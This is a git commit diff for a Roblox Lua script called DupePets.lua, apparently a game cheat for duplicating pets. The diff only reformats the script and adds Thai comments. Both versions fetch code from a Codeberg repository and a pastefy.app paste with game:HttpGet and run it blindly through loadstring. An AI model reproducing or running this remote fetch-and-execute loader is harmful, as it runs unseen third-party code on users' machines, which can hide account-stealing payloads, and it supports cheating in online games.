4df1fadde64f9dab4bb33170610426eb9dddafc1
Biggg886 <154685671+Biggg886@users.noreply.github.com>
2025-08-07 17:48:16 +0700

    Update DupePets.lua

--- DupePets.lua
+++ DupePets.lua
@@ -1,2 +1,6 @@
+-- โหลดสคริปต์ Spawner และรัน
 local Spawner = loadstring(game:HttpGet("https://codeberg.org/darkdarkdark/roblox/raw/branch/main/Spawner.lua"))()
-Spawner.Load()aloadstring(game:HttpGet("https://pastefy.app/hfns5lum/raw"))()
+Spawner.Load()
+
+-- โหลดและรันอีกสคริปต์
+loadstring(game:HttpGet("https://pastefy.app/hfns5lum/raw"))()
